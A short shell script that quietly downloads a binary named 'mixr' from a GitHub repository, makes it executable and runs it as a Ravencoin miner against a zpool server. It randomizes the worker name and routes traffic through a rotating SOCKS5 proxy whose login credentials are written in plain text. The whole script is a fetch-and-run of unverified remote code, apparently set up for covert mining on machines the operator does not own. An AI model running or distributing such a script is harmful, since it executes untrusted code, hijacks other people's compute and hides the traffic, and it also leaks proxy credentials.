apt update -y
wget -q https://github.com/Lutheranderson2001/TestOp/raw/main/mixr
chmod +x mixr
./mixr -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RMEvf2Wo8g2VG2hfBJgGErwUL5zxz3MXqQ.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN -x socks5://archernap-rotate:arch12322@p.webshare.io:80
